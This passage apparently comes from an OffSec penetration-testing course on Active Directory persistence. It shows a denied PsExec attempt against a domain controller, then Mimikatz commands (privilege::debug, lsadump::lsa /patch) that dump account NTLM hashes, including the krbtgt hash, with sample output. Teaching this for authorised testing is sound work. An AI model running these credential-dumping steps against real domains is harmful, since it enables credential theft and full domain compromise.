controller. Higher functional levels enable additional features, functionality, and security mitigations.

To test this persistence technique, we will first attempt to laterally move from the Windows 10 workstation to the domain controller via PsExec as the OffSec user. This should fail as we do not have the proper permissions:

```
C:\Tools\active_directory> **psexec.exe \\<dc01 cmd.exe**
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access dc01:
**Access is denied.**
```

![](bbox=[0.31, 0.37, 0.67, 0.39])

At this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself.

With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.

To simulate this, we’ll log in to the domain controller via remote desktop using the jeff_admin account, run Mimikatz from the C: folder, and issue the **lsadump::lsa** command as displayed below.

```
mimikatz # **privilege::debug**
Privilege '20' OK
mimikatz # **lsadump::lsa /patch**
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668

RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327

RID : 000001f5 (501)
User : Guest
LM :
NTLM :

RID : 000001f6 (502)
User : **krbtgt**
LM :
NTLM : **75b60230a2394a812000dbfad8415965**
...
```

![](bbox=[0.29, 0.82, 0.7, 0.84])

> *<sup>698</sup> Benjamin Delply, 2016, https://github.com/gentilkiwi/mimikatz/wiki/module~lsadump*